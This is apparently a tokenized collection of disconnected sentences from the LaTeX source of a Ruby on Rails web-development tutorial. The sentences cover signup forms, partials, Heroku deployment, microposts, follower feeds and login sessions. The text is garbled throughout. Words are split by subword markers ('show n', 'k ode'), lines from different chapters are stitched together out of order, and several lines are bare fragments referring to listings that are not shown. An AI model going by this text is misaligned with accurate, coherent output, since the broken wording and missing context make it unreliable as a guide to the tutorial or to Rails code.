▁If ▁you ▁like , ▁you ▁can ▁verify ▁that ▁the ▁form ▁show n ▁in ▁F igure ~\ ref { fig : home _ with _ form } ▁is ▁working ▁by ▁ submitting ▁a ▁valid ▁entry ▁and ▁the n ▁navigat ing ▁to ▁the ▁\ href { http ://0.0.0.0:3000/ users /1}{ profile ▁page } ▁to ▁see ▁the ▁post , ▁but ▁that ' s ▁rather ▁cumbersome .
▁Because ▁of ▁this ▁ danger , ▁it ▁is ▁essential ▁to ▁pass ▁parameters ▁that ▁have ▁been ▁processed ▁to ▁ permit ▁only ▁safe - to - edit ▁attributes .
▁as ▁show n ▁in ▁Listing ~\ ref { code : action _ tests _ admin }.
▁Running ▁\ k ode { render ▁@ users } ▁automatically ▁calls ▁the ▁\ k ode { \_ user . html . erb } ▁partial ▁on ▁each ▁user ▁in ▁the ▁collection .
▁\ emph { Hint : } ▁S e ar ch ▁the ▁web ; ▁you ▁should ▁find ▁one ▁particular ly ▁ r ob us t ▁method ▁ involving ▁something ▁called ▁\ k ode { \_ blank }.
▁Re m o ve ▁the ▁duplicate d ▁form ▁code ▁by ▁refactoring ▁the ▁\ k ode { new . html . erb } ▁and ▁\ k ode { edit . html . erb } ▁views ▁to ▁use ▁the ▁partial ▁in ▁Listing ~\ ref { code : new _ edit _ partial }.
▁Note ▁that ▁you ▁will ▁have ▁to ▁pass ▁the ▁form ▁variable ~\ k ode { f } ▁explicitly ▁as ▁a ▁local ▁variable , ▁as ▁show n ▁in ▁Listing ~\ ref { code : new _ user _ with _ partial }.
▁ Sign ed - in ▁users ▁have ▁no ▁reason ▁to ▁access ▁the ▁\ k ode { new } ▁and ▁\ k ode { create } ▁actions ▁in ▁the ▁Users ▁controller .
▁A r range ▁for ▁such ▁users ▁to ▁be ▁redirect ed ▁to ▁the ▁root ▁URL ▁if ▁they ▁do ▁try ▁to ▁hit ▁those ▁pages .
▁Mo d ify ▁the ▁\ k ode { destroy } ▁action ▁to ▁prevent ▁admin ▁users ▁from ▁destroying ▁themselves .
▁( Writ e ▁a ▁test ▁first .)
▁A ▁partial ▁for ▁the ▁new ▁and ▁edit ▁form ▁fields .
▁< script ▁src =" http :// html 5 shim . google code . com / s v n / tr un k / html 5 . js " ></ script >
▁< script ▁src =" http :// html 5 shim . google code . com / s v n / tr un k / html 5 . js " ></ script >
▁In ▁previous ▁versions ▁of ▁Rails , ▁the ▁\ k ode { rails . png } ▁ logo ▁was ▁included ▁automatically ▁with ▁every ▁Rails ▁project , ▁but ▁in ▁the ▁latest ▁version ▁it ▁does n ' t ▁get ▁generated ▁as ▁part ▁of ▁\ k ode { rails ▁new }, ▁so ▁you ▁should ▁ download ▁it ▁from ▁the ▁main ▁Ruby ▁on ▁Rails ▁page ▁at ▁\ href { http :// rubyonrails . org / images / rails . png }{ http :// rubyonrails . org / images / rails . png } ▁and ▁place ▁it ▁in ▁the ▁\ k ode { app / assets / images / } ▁directory .
▁Because ▁of ▁the ▁\ k ode { navbar - fixed - to p } ▁class ▁in ▁the ▁\ k ode { header } ▁tag , ▁Bootstrap ▁fix es ▁the ▁navigation ▁bar ▁to ▁the ▁to p ▁of ▁the ▁page , ▁so ▁the ▁p adding ▁serve s ▁to ▁separate ▁the ▁main ▁text ▁from ▁the ▁navigation .
▁The ▁effect ▁of ▁this ▁line ▁is ▁to ▁look ▁for ▁a ▁file ▁called ▁\ k ode { app / views / layouts / \_ shim . html . erb }, ▁evaluate ▁its ▁contents , ▁and ▁insert ▁the ▁results ▁into ▁the ▁view
▁By ▁now ▁you ▁can ▁ probably ▁guess ▁that ▁we ' ll ▁call ▁it ▁\ k ode { \_ footer . html . erb } ▁and ▁put ▁it ▁in ▁the ▁layout s ▁directory ▁( Listing ~\ ref { code : footer _ partial })
▁A lthough ▁the ▁view ▁will ▁exist ▁as ▁a ▁single ▁page ▁of ▁code , ▁each ▁profile ▁will ▁be ▁customize d ▁using ▁information ▁retrieved ▁from ▁the ▁site ' s ▁database .
▁As ▁with ▁the ▁console , ▁\ text tt { development } ▁is ▁the ▁default ▁environment ▁for ▁the ▁local ▁Rails ▁server , ▁but ▁you ▁can ▁also ▁run ▁it ▁in ▁a ▁different ▁environment :
▁A ▁test ▁for ▁the ▁user ▁show ▁page .
▁We ' ll ▁use ▁the ▁standard ▁Rails ▁location ▁for ▁show ing ▁a ▁user , ▁which ▁is ▁\ k ode { app / views / users / show . html . erb }.
▁Un like ▁the ▁\ k ode { new . html . erb } ▁view , ▁which ▁we ▁created ▁with ▁the ▁generator ▁in ▁Listing ~\ ref { code : generate _ users _ controller }, ▁the ▁\ k ode { show . html . erb } ▁file ▁does n ' t ▁current ly ▁exist , ▁so ▁you ' ll ▁have ▁to ▁create ▁it ▁by ▁hand , ▁and ▁the n ▁fill ▁it ▁with ▁the ▁content ▁show n ▁in ▁Listing ~\ ref { code : stub _ user _ view }.
▁As ▁before , ▁we ' ll ▁use ▁\ k ode { generate } ▁to ▁make ▁the ▁simplest ▁controller ▁that ▁me et s ▁our ▁present ▁needs , ▁name ly , ▁one ▁with ▁a ▁ stub ▁signup ▁page ▁for ▁new ▁users .
▁When ▁we ▁make ▁the ▁appropriate ▁request ▁to ▁the ▁Users ▁controller , ▁\ k ode { params [: id ]} ▁will ▁be ▁the ▁user ▁id ~\ text tt {1} , ▁so ▁the ▁effect ▁is ▁the ▁same ▁as ▁the ▁\ k ode { find } ▁method
▁With ▁the ▁user ▁view ▁and ▁action ▁defined , ▁the ▁URL ▁\ href { http ://0.0.0.0:3000/ users /1}{ / users /1 } ▁works ▁ perfect ly , ▁as ▁seen ▁in ▁F igure ~\ ref { fig : user _ show _ rails }.
▁Note ▁that ▁the ▁debug ▁information ▁in ▁F igure ~\ ref { fig : user _ show _ rails } ▁confirm s ▁the ▁value ▁of ▁\ k ode { params [: id ]} :
▁To ▁get ▁our ▁application ▁to ▁display ▁a ▁custom ▁Gravatar , ▁we ' ll ▁use ▁\ k ode { update \_ attributes } ▁( Section ~\ ref { sec : updating _ user _ objects }) ▁to ▁change ▁the ▁user ' s ▁email ▁to ▁something ▁I ▁control :
▁The ▁current ▁state ▁of ▁the ▁signup ▁page ▁\ href { http ://0.0.0.0:3000/ signup }{/ signup }.
▁The ▁clean est ▁way ▁to ▁do ▁this ▁is ▁to ▁reset ▁the ▁database ▁with ▁the ▁\ k ode { db : reset } ▁Rake ▁task :
▁After ▁reset ting ▁the ▁database , ▁on ▁some ▁systems ▁the ▁test ▁database ▁needs ▁to ▁be ▁re - prepare d ▁as ▁well :
▁F inally , ▁on ▁some ▁systems ▁you ▁m ight ▁have ▁to ▁restart ▁the ▁web ▁server ▁( using ▁\ text tt { Ctrl - C }) ▁for ▁the ▁changes ▁to ▁take ▁effect
▁When ▁construct ing ▁a ▁form ▁using ▁\ k ode { form \_ for (@ user ) }, ▁Rails ▁uses ▁\ text tt { POST } ▁if ▁\ k ode {@ user . new \_ record ?}\ ▁is ▁\ k ode { true } ▁and ▁\ text tt { PATCH } ▁if ▁it ▁is ▁\ k ode { false }.
▁These ▁\ k ode { name } ▁values ▁allow ▁Rails ▁to ▁construct ▁an ▁initialization ▁hash ▁( via ▁the ▁\ k ode { params } ▁variable ) ▁for ▁creating ▁users ▁using ▁the ▁values ▁entered ▁by ▁the ▁user , ▁as ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : unsuccessful _ signup s }.
▁A ▁\ k ode { create } ▁action ▁that ▁can ▁handle ▁signup ▁failure ▁( but ▁not ▁ success ).
▁In ▁the ▁case ▁of ▁a ▁URL ▁like ▁/ users /1 , ▁the ▁value ▁of ▁\ k ode { params [: id ]} ▁is ▁the ▁\ k ode { id } ▁of ▁the ▁corresponding ▁user ▁(\ k ode {1} ~ in ▁this ▁example ).
▁As ▁a ▁final ▁refactoring , ▁we ' ll ▁a do p t ▁a ▁common ▁convention ▁and ▁define ▁a ▁\ k ode { current \_ user ?}\ ▁boolean ▁method ▁for ▁use ▁in ▁the ▁\ k ode { correct \_ user } ▁before ▁filter , ▁which ▁we ▁define ▁in ▁the ▁Sessions ▁helper ▁( Listing ~\ ref { code : current _ user _ p }).
▁returns ▁\ k ode {" 0 ▁errors " }, ▁\ k ode {" 1 ▁error " }, ▁\ k ode {" 2 ▁errors " }, ▁and ▁so ▁on , ▁depending ▁on ▁how ▁many ▁errors ▁there ▁are , ▁there by ▁avoid ing ▁ungrammatical ▁ ph ra s es ▁such ▁as ▁\ k ode {" 1 ▁errors "} ▁( a ▁d ist re s s ing ly ▁common ▁mistake ▁on ▁\ href { http :// www . u rb and ic t ion ary . com / define . ph p ? ter m = in ter web s }{ t e h ▁in ter web s }).
▁In ▁addition , ▁on ▁error ▁pages ▁Rails ▁automatically ▁wrap s ▁the ▁fields ▁with ▁errors ▁in ▁\ k ode { div } s ▁with ▁the ▁CSS ▁class ▁\ k ode { field \_ with \_ errors }.
▁By ▁wrapp ing ▁the ▁\ k ode { post } ▁in ▁the ▁\ k ode { assert \_ no \_ difference } ▁method ▁with ▁the ▁string ▁argument ▁\ k ode { ' User . count ' }, ▁we ▁arrange ▁for ▁a ▁comparison ▁between ▁\ k ode { User . count } ▁before ▁and ▁after ▁the ▁contents ▁of ▁the ▁\ k ode { assert \_ no \_ difference } ▁block .
▁To ▁make ▁use ▁of ▁\ k ode { store \_ location }, ▁we ▁need ▁to ▁add ▁it ▁to ▁the ▁\ k ode { logged \_ in \_ user } ▁before ▁filter , ▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ store _ location }.
▁To ▁complete ▁a ▁working ▁signup ▁form , ▁we ▁need ▁to ▁fill ▁in ▁the ▁comment ed - out ▁section ▁in ▁Listing ~\ ref { code : first _ create _ action } ▁with ▁the ▁appropriate ▁behavior .
▁make s ▁a ▁CSS ▁class ▁corresponding ▁to ▁the ▁type ▁of ▁message , ▁so ▁that ▁for ▁a ▁\ k ode { : success } ▁message ▁the ▁class ▁is
▁As ▁with ▁\ k ode { assert \_ no \_ difference }, ▁the ▁first ▁argument ▁is ▁the ▁string ▁\ k ode { ' User . count ' }, ▁which ▁arrange s ▁for ▁a ▁comparison ▁between ▁\ k ode { User . count } ▁before ▁and ▁after ▁the ▁contents ▁of ▁the ▁\ k ode { assert \_ difference } ▁block .
▁For ▁this ▁test ▁to ▁work , ▁it ' s ▁necessary ▁for ▁the ▁Users ▁routes ▁( Listing ~\ ref { code : users _ resource }), ▁the ▁Users ▁\ k ode { show } ▁action ▁( Listing ~\ ref { code : user _ show _ action }), ▁and ▁the ▁\ k ode { show . html . erb } ▁view ▁( Listing ~\ ref { code : user _ show _ view _ with _ gravatar }) ▁to ▁work ▁correctly .
▁E n a b l ing ▁SSL ▁is ▁as ▁easy ▁as ▁uncomment ing ▁a ▁single ▁line ▁in ▁\ k ode { production . rb }, ▁the ▁configuration ▁file ▁for ▁production ▁applications .
▁To ▁get ▁the ▁production ▁site ▁working , ▁we ▁have ▁to ▁commit ▁the ▁change ▁to ▁the ▁configuration ▁file ▁and ▁push ▁the ▁result ▁up ▁to ▁Heroku :
▁Next , ▁we ▁need ▁to ▁run ▁the ▁migration ▁on ▁the ▁production ▁database ▁to ▁tell ▁Heroku ▁about ▁the ▁User ▁data ▁model :
▁As ▁a ▁result , ▁when ▁we ▁deploy ▁the ▁application ▁in ▁Section ~\ ref { sec : unicorn _ in _ production }, ▁SSL ▁will ▁automatically ▁be ▁enabled .
▁as ▁show n ▁in ▁Listing ~\ ref { code : unicorn _ gemfile }.
▁Because ▁we ▁configured ▁Bundler ▁not ▁to ▁install ▁production ▁gems ▁( Section ~\ ref { sec : sample _ app _ setup }), ▁Listing ~\ ref { code : unicorn _ config } ▁won ' t ▁add ▁any ▁gems ▁to ▁the ▁development ▁environment , ▁but ▁we ▁ still ▁need ▁to ▁run ▁Bundler ▁to ▁update ▁\ k ode { Gemfile . lock } :
▁Listing ~\ ref { code : unicorn _ config } ▁changes ▁the ▁format ting ▁slightly ▁so ▁that ▁the ▁code ▁fit s ▁in ▁the ▁standard ▁80 ▁columns .
▁The ▁\ k ode { Proc file } ▁should ▁be ▁created ▁in ▁your ▁application ' s ▁root ▁directory ▁( i . e . , ▁in ▁the ▁same ▁location ▁as ▁the ▁\ k ode { Gemfile }).
▁As ▁usual , ▁we ▁add ▁the ▁\ k ode { admin } ▁attribute ▁with ▁a ▁migration , ▁indicat ing ▁the ▁\ k ode { boolean } ▁type ▁on ▁the ▁command ▁line :
▁Defin ing ▁an ▁optional ▁\ k ode { : size } ▁parameter ▁for ▁the ▁\ k ode { gravatar \_ for } ▁helper .
▁automatically ▁render s ▁each ▁of ▁the ▁users ▁in ▁the ▁\ k ode {@ users } ▁variable ▁using ▁the ▁\ k ode { \_ user . html . erb } ▁partial .
▁In ▁the ▁present ▁case , ▁since ▁we ▁are ▁ still ▁in ▁the ▁Users ▁controller ▁but ▁want ▁to ▁ paginate ▁\ emph { microposts } ▁instead , ▁we ' ll ▁pass ▁an ▁explicit ▁\ k ode {@ microposts } ▁variable ▁to ▁\ k ode { will \_ paginate }.
▁The ~\ k ode { id } ▁attribute ▁here ▁is ▁just ▁an ▁integer ▁( i . e . , ▁\ k ode { self . id }, ▁the ▁unique ▁ ID ▁of ▁the ▁user ), ▁so ▁there ▁is ▁no ▁ danger ▁of ▁SQL ▁injection ▁in ▁this ▁case , ▁but ▁\ emph { always } ▁es ca p ing ▁variables ▁inject ed ▁into ▁SQL ▁statement s ▁is ▁a ▁good ▁habit ▁to ▁c ul t i v ate .
▁Here ▁Rails ▁know s ▁to ▁call ▁the ▁micropost ▁partial ▁because ▁each ▁element ▁of ▁\ k ode {@ feed \_ item s } ▁has ▁class ▁\ k ode { Micropost }.
▁Note ▁that , ▁a part ▁from ▁ having ▁\ k ode { Micropost sController } ▁in ▁place ▁of ▁\ k ode { UsersController }, ▁Listing ~\ ref { code : demo _ microposts _ controller } ▁is ▁\ emph { id ent ical } ▁to ▁the ▁code ▁in ▁Listing ~\ ref { code : demo _ users _ controller }.
▁At ▁this ▁point , ▁you ▁should ▁open ▁the ▁file ▁\ k ode { app / models / micropost . rb } ▁in ▁your ▁text ▁editor ▁or ▁IDE ▁and ▁fill ▁it ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : demo _ length _ validation }.
▁It ▁is ▁by ▁inherit ing ▁from ▁\ k ode { ActiveRecord :: Base } ▁that ▁our ▁model ▁objects ▁gain ▁the ▁ability ▁to ▁communicat e ▁with ▁the ▁database , ▁treat ▁the ▁database ▁columns ▁as ▁Ruby ▁attributes , ▁and ▁so ~ on .
▁in ▁Listing ~\ ref { code : layout _ flash }.
▁in ▁Listing ~\ ref { code : flash _ test }.
▁P utting ▁together ▁the ▁discussion ▁above ▁yields ▁the ▁User ▁model ▁show n ▁in ▁Listing ~\ ref { code : before _ create _ activation _ digest }.
▁In ▁Section ~\ ref { sec : activating _ the _ account }, ▁we ' ll ▁complete ▁the ▁process ▁by ▁adding ▁some ▁tests ▁and ▁the n ▁doing ▁a ▁little ▁refactoring .
▁Because ▁the ▁\ k ode { deliveries } ▁array ▁is ▁g lo b al , ▁we ▁have ▁to ▁reset ▁it ▁in ▁the ▁\ k ode { setup } ▁method ▁to ▁prevent ▁our ▁code ▁from ▁break ing ▁if ▁any ▁other ▁tests ▁ deliver ▁email ▁( as ▁will ▁be ▁the ▁case ▁in ▁Section ~\ ref { sec : password _ reset _ test }).
▁This ▁is ▁easy ▁using ▁the ▁named ▁route ▁\ k ode { edit \_ user \_ path } ▁from ▁Table ~\ ref { table : RESTful _ users }, ▁together ▁with ▁the ▁hand y ▁\ k ode { current \_ user } ▁helper ▁method ▁defined ▁in ▁Listing ~\ ref { code : current _ user _ working } :
▁The ▁email ▁configuration ▁in ▁Listing ~\ ref { code : s end gr id _ config } ▁includes ▁the ▁\ k ode { user \_ name } ▁and ▁\ k ode { password } ▁of ▁the ▁SendGrid ▁account , ▁but ▁note ▁that ▁they ▁are ▁access ed ▁via ▁the ▁\ k ode { ENV } ▁environment ▁variable ▁instead ▁of ▁being ▁hard - code d .
▁in ▁Listing ~\ ref { code : password _ reset _ expire _ test }.
▁in ▁Listing ~\ ref { code : ge n er al _ authenticated _ p }.
▁L oo k ing ▁the ▁Bootstrap ▁variable ▁page , ▁we ▁see ▁that ▁there ▁is ▁a ▁variable ▁for ▁light ▁gra y :
▁Then , ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }, ▁we ' ll ▁complete ▁the ▁foundation ▁for ▁the ▁sample ▁application ▁by ▁making ▁a ▁site ▁layout , ▁a ▁user ▁data ▁model , ▁and ▁a ▁full ▁re g ist r ation ▁and ▁authentication ▁system ▁( including ▁account ▁activation ▁and ▁password ▁resets ).
▁from ▁Listing ~\ ref { code : footer _ css } ▁to
▁ Data ▁accessible ▁to ▁the ▁public ▁( e . g . , ▁web ▁browsers ), ▁such ▁as ▁error ▁pages
▁42 ▁files ▁changed , ▁ 8 4 6 1 ▁insert ion s ( + ), ▁0 ▁deletion s ( - )
▁create ▁mode ▁100 64 4 ▁README . rdoc
▁create ▁mode ▁100 64 4 ▁Rake file
▁Here ▁we ' re ▁using ▁the ▁Unix ▁\ k ode { l s } ▁command ▁to ▁list ▁the ▁contents ▁of ▁the ▁\ k ode { app / controllers / } ▁directory ▁and ▁the ▁\ k ode { rm } ▁command ▁to ▁remove ▁it ▁( Table ~\ ref { table : un i x _ command s }).
▁Note ▁also ▁the ▁addition ▁of ▁the ▁\ text tt { rails \_ 12 factor } ▁gem , ▁which ▁is ▁used ▁by ▁Heroku ▁to ▁serve ▁static ▁assets ▁such ▁as ▁images ▁and ▁stylesheets .
▁Rails ▁comes ▁with ▁a ▁command - line ▁command ▁called ▁\ k ode { rails } ▁that ▁can ▁generate ▁new ▁applications ▁(\ k ode { rails ▁new }) ▁and ▁run ▁local ▁server s ▁(\ k ode { rails ▁server }).
▁Because ▁we ▁will ▁be ▁find ing ▁relationships ▁by ▁\ k ode { follower \_ id } ▁and ▁by ▁\ k ode { followed \_ id }, ▁we ▁should ▁add ▁an ▁index ▁on ▁each ▁column ▁for ▁e ff ic i en c y , ▁as ▁show n ▁in ▁Listing ~\ ref { code : relationships _ migration }.
▁By ▁refer r ing ▁to ▁the ▁methods ▁in ▁Table ~\ ref { table : association _ methods _ relationships }, ▁we ▁can ▁write ▁the ▁\ k ode { follow }, ▁\ k ode { unfollow }, ▁and ▁\ k ode { following ?}\ ▁methods ▁using ▁the ▁association ▁with ▁\ k ode { following }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : follow _ unfollow _ following }.
▁We ▁can ▁convenient ly ▁test ▁the ▁data ▁model ▁above ▁using ▁the ▁\ k ode { followers . include ?}\ ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : followers _ test }.
▁As ▁we ' ve ▁seen ▁throughout ▁this ▁tutorial , ▁the ▁usual ▁Rails ▁convention ▁is ▁to ▁ implicit ly ▁render ▁the ▁template ▁corresponding ▁to ▁an ▁action , ▁such ▁as ▁rendering ▁\ k ode { show . html . erb } ▁at ▁the ▁end ▁of ▁the ▁\ k ode { show } ▁action .
▁To ▁get ▁the ▁follow ▁and ▁unfollow ▁button s ▁to ▁work , ▁all ▁we ▁need ▁to ▁do ▁is ▁find ▁the ▁user ▁ associated ▁with ▁the ▁\ k ode { followed \_ id } ▁in ▁the ▁corresponding ▁form ▁( i . e . , ▁Listing ~\ ref { code : follow _ form } ▁or ▁Listing ~\ ref { code : unfollow _ form }), ▁and ▁the n ▁use ▁the ▁appropriate ▁\ k ode { follow } ▁or ▁\ k ode { unfollow } ▁method ▁from ▁Listing ~\ ref { code : follow _ unfollow _ following }.
▁The ▁updated ▁partials ▁appear ▁in ▁Listing ~\ ref { code : follow _ form _ ajax } ▁and ▁Listing ~\ ref { code : unfollow _ form _ ajax }.
▁F igure ~\ ref { fig : user _ feed } ▁shows ▁a ▁sample ▁\ k ode { microposts } ▁database ▁table ▁and ▁the ▁result ing ▁feed .
▁The ▁feed ▁for ▁a ▁user ▁( id ▁1) ▁following ▁users ▁2, ▁7 , ▁ 8 , ▁and ▁10 .
▁A lthough ▁we ▁don ' t ▁yet ▁know ▁how ▁to ▁implement ▁it , ▁we ▁can ▁already ▁write ▁tests ▁for ▁its ▁functionality .
▁The ▁key ▁is ▁to ▁check ▁all ▁three ▁requirements ▁for ▁the ▁feed : ▁microposts ▁for ▁followed ▁users ▁and ▁the ▁user ▁itself ▁should ▁be ▁included ▁in ▁the ▁feed , ▁but ▁a ▁post ▁from ▁an ▁\ emph { unfollow ed } ▁user ▁should ▁not ▁be ▁included .
▁S ince ▁the ▁final ▁result ▁is ▁rather ▁in tr ic ate , ▁we ' ll ▁build ▁up ▁to ▁the ▁final ▁feed ▁implementation ▁by ▁introduc ing ▁one ▁piece ▁at ▁a ▁time .
▁What ▁we ▁want ▁to ▁do ▁is ▁select ▁from ▁the ▁\ k ode { microposts } ▁table ▁all ▁the ▁microposts ▁with ▁id s ▁corresponding ▁to ▁the ▁users ▁being ▁followed ▁by ▁a ▁given ▁user ▁( or ▁the ▁user ▁itself ).
▁( Here ▁we ' ve ▁used ▁the ▁Rails ▁convention ▁of ▁\ k ode { user } ▁instead ▁of ▁\ k ode { user . id } ▁in ▁the ▁condition ; ▁Rails ▁automatically ▁uses ▁the ~\ k ode { id }.
▁The ▁Micropost ▁migration .
▁( Note ▁the ▁index ▁on ▁\ k ode { user \_ id } ▁and ▁\ k ode { created \_ at }. )
▁This ▁notation ▁actually ▁started ▁as ▁an ▁extension ▁Rails ▁made ▁to ▁the ▁core ▁Ruby ▁language ; ▁it ▁was ▁so ▁useful ▁that ▁it ▁has ▁now ▁been ▁incorporate d ▁into ▁Ruby ▁itself .
▁You ▁can ▁verify ▁this ▁yourself ▁by ▁running ▁the ▁test ▁suite , ▁which ▁should ▁pass :
▁In ▁some ▁applications , ▁this ▁initial ▁implementation ▁m ight ▁be ▁good ▁enough ▁for ▁most ▁practical ▁purposes .
▁But ▁it ' s ▁not ▁the ▁final ▁implementation ; ▁see ▁if ▁you ▁can ▁make ▁a ▁guess ▁about ▁why ▁not ▁before ▁mov ing ▁on ▁to ▁the ▁next ▁section .
▁(\ emph { Hint : } ▁What ▁if ▁a ▁user ▁is ▁following ▁5 000 ▁other ▁users ? )
▁( It ▁actually ▁works ▁either ▁way , ▁but ▁logic ally ▁it ▁make s ▁more ▁sense ▁to ▁interpolate ▁in ▁this ▁context .)
▁This ▁code ▁has ▁a ▁form id able ▁combination ▁of ▁Rails , ▁Ruby , ▁and ▁SQL , ▁but ▁it ▁does ▁the ▁job , ▁and ▁does ▁it ▁well .
▁( O f ▁course , ▁even ▁the ▁ subselect ▁won ' t ▁scale ▁for ever .
▁For ▁big g er ▁site s , ▁you ▁would ▁ probably ▁need ▁to ▁generate ▁the ▁feed ▁a synchronously ▁using ▁a ▁background ▁job , ▁but ▁such ▁scaling ▁subtle t ies ▁are ▁ beyond ▁the ▁scope ▁of ▁this ▁tutorial .)
▁( You ▁can ▁verify ▁this ▁by ▁examining ▁the ▁SQL ▁statement s ▁in ▁the ▁development ▁server ▁log ▁file .)
▁The ▁result ing ▁test ▁appears ▁in ▁Listing ~\ ref { code : home _ feed _ test }.
▁As ▁a ▁first ▁step ▁in ▁this ▁process , ▁this ▁section ▁contains ▁some ▁suggest ed ▁extensions ▁to ▁the ▁core ▁application , ▁as ▁well ▁as ▁suggest ion s ▁for ▁further ▁learning .
▁Before ▁mov ing ▁on ▁to ▁t ac k le ▁any ▁of ▁the ▁application ▁extensions , ▁it ' s ▁a ▁good ▁idea ▁to ▁merge ▁in ▁your ▁changes :
▁As ▁usual , ▁you ▁can ▁also ▁push ▁the ▁code ▁and ▁deploy ▁the ▁application ▁if ▁you ▁want :
▁\ href { http :// r ailscasts . com /}{ RailsCast s } : ▁It ' s ▁hard ▁to ▁over emph a size ▁what ▁a ▁great ▁resource ▁ RailsCast s ▁is .
▁I ▁suggest ▁starting ▁by ▁visit ing ▁the ▁\ href { http :// r ailscasts . com / episodes / archive }{ RailsCast s ▁e p is ode ▁ archive } ▁and ▁click ing ▁on ▁subject s ▁that ▁catch ▁your ▁e y e .
▁Ou r ▁first ▁step ▁is ▁to ▁add ▁a ▁delete ▁link ▁to ▁the ▁micropost ▁partial ▁as ▁in ▁Listing ~\ ref { code : feed _ item _ partial }.
▁in ▁Listing ~\ ref { code : micropost _ model _ image _ validation }.
▁No t ▁co in cidentally , ▁we ▁already ▁have ▁exactly ▁the ▁methods ▁we ▁need : ▁the ▁\ k ode { User . find \_ by } ▁method ▁provided ▁by ▁Active ▁Record ▁( Section ~\ ref { sec : find ing _ user _ objects }) ▁and ▁the ▁\ k ode { authenticate } ▁method ▁provided ▁by ▁\ k ode { has \_ secure \_ password } ▁( Section ~\ ref { sec : user _ authentication }).
▁The ▁result ▁of ▁the ▁CSS ▁in ▁Listing ~\ ref { code : universal _ css } ▁is ▁show n ▁in ▁F igure ~\ ref { fig : sample _ app _ universal }.
▁App ly ing ▁the ▁results ▁of ▁the ▁above ▁discussion ▁yields ▁the ▁succinct ▁\ k ode { current \_ user } ▁method ▁show n ▁in ▁Listing ~\ ref { code : current _ user }.
▁in ▁Listing ~\ ref { code : header _ partial } ▁and
▁A ▁user ▁is ▁logged ▁in ▁if ▁there ▁is ▁a ▁current ▁user ▁in ▁the ▁session , ▁i . e . , ▁if ▁\ k ode { current \_ user } ▁is ▁not ▁\ k ode { nil }.
▁In ▁versions ▁of ▁Rails ▁before ▁3.0 ▁( including ▁3.0 ▁itself ), ▁static ▁assets ▁live d ▁in ▁the ▁\ k ode { public / } ▁directory , ▁as ▁follows :
▁A lthough ▁we ' ve ▁defined ▁the ▁\ k ode { password \_ digest } ▁attribute ▁required ▁by ▁\ k ode { has \_ secure \_ password }, ▁some times ▁it ' s ▁convenient ▁to ▁refer ▁to ▁the ▁plain ▁( v ir t u al ) ▁password ▁as ▁well .
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ login _ test _ valid _ information }.
▁Because ▁the ▁application ▁code ▁was ▁already ▁working , ▁this ▁test ▁should ▁be ▁\ passing :
▁With ▁the ▁asset ▁pipeline , ▁we ▁don ' t ▁have ▁to ▁choose ▁between ▁speed ▁and ▁convenience :
▁With ▁the ▁session ▁\ k ode { destroy } ▁action ▁thus ▁defined ▁and ▁test ed , ▁the ▁initial ▁signup / login / logout ▁tr i um v ir ate ▁is ▁complete , ▁and ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁Using ▁\ k ode { self } ▁ensure s ▁that ▁assignment ▁set s ▁the ▁user ' s ▁\ k ode { remember \_ token } ▁attribute .
▁With ▁these ▁consider ation s ▁in ▁mind , ▁we ▁can ▁create ▁a ▁valid ▁token ▁and ▁ associated ▁digest ▁by ▁first ▁making ▁a ▁new ▁remember ▁token ▁using ▁\ k ode { User . new \_ token }, ▁and ▁the n ▁updating ▁the ▁remember ▁digest ▁with ▁the ▁result ▁of ▁apply ing ▁\ k ode { User . digest }. ▁This ▁ procedure ▁gives ▁the ▁\ k ode { remember } ▁method ▁show n ▁in ▁Listing ~\ ref { code : user _ model _ remember }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : remember _ me _ css }.
▁More over , ▁ persistent ▁sessions ▁are ▁cumbersome ▁to ▁check ▁by ▁hand , ▁so ▁if ▁we ▁ever ▁want ▁to ▁refactor ▁the ▁\ k ode { current \_ user } ▁method ▁( as ▁we ▁will ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }) ▁it ' s ▁important ▁to ▁test ▁it .
▁as ▁show n ▁in ▁Listing ~\ ref { code : persistent _ sessions _ test }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : log _ out _ with _ _ close _ browser }
▁as ▁show n ▁in ▁Listing ~\ ref { code : close _ route }.
▁in ▁Listing ~\ ref { code : _ close _ browser }.
▁in ▁Listing ~\ ref { code : close _ route }.
▁F inally , ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets } ▁we ' ll ▁add ▁account ▁activation ▁( the re by ▁confirm ing ▁a ▁valid ▁email ▁address ) ▁and ▁password ▁resets .
▁Take n ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁( The ▁first ▁line ▁here ▁is ▁just ▁to ▁make ▁sure ▁that ▁you ▁start ▁on ▁the ▁master ▁branch , ▁so ▁that ▁the ▁\ k ode { modeling - users } ▁topic ▁branch ▁is ▁base d ▁on ▁\ k ode { master }.
▁By ▁using ▁an ▁email ▁address ▁as ▁the ▁username , ▁we ▁open ▁the ▁possibility ▁of ▁communicat ing ▁with ▁our ▁users ▁at ▁a ▁future ▁date ▁( Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }).
▁The ▁migration ▁itself ▁consist s ▁of ▁a ▁\ k ode { change } ▁method ▁that ▁determine s ▁the ▁change ▁to ▁be ▁made ▁to ▁the ▁database .
▁In side ▁the ▁block , ▁the ▁\ k ode { create \_ table } ▁method ▁uses ▁the ▁\ k ode { t } ~ object ▁to ▁create ▁\ k ode { name } ▁and ▁\ k ode { email } ▁columns ▁in ▁the ▁database , ▁both ▁of ▁type ▁\ k ode { string }
